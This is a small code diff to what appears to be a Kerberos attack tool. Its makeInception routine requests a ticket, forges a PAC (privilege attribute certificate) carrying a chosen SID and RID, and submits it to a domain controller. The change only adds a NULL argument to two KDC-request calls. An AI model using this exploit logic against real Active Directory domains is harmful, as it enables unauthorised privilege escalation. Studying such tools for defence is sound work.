@@ -169,7 +169,7 @@ void makeInception(PCSTR user, PCSTR domain, PSID sid, DWORD rid, PCSTR target, 
 	if(kull_m_sock_initSocket(kdc, port, &connectSocket))
 	{
 		kprintf(" [level   1] Reality       (AS-REQ)\n");
-		if(kull_m_kerberos_asn1_helper_build_KdcReq(user, domain, key, NULL, NULL, FALSE, NULL, NULL, &AsReq))
+		if(kull_m_kerberos_asn1_helper_build_KdcReq(user, domain, key, NULL, NULL, NULL, FALSE, NULL, NULL, &AsReq))
 		{
 			if(kull_m_kerberos_helper_net_callKdcOssBuf(&connectSocket, &AsReq, (LPVOID *) &AsRep, AS_REP_PDU))
 			{
@@ -179,7 +179,7 @@ void makeInception(PCSTR user, PCSTR domain, PSID sid, DWORD rid, PCSTR target, 
 					if(kuhl_m_pac_giveMePac(user, sid, rid, &encAsRepPart->authtime, KERB_CHECKSUM_MD5, NULL, &pac))
 					{
 						kprintf(" [level   3] The Hotel     (TGS-REQ)\n");
-						if(kull_m_kerberos_asn1_helper_build_KdcReq(user, domain, &encAsRepPart->key, service, target, FALSE, &AsRep->ticket, &pac, &TgsReq))
+						if(kull_m_kerberos_asn1_helper_build_KdcReq(user, domain, &encAsRepPart->key, service, target, NULL, FALSE, &AsRep->ticket, &pac, &TgsReq))
 						{
 							if(kull_m_kerberos_helper_net_callKdcOssBuf(&connectSocket, &TgsReq, (LPVOID *) &TgsRep, TGS_REP_PDU))
 							{
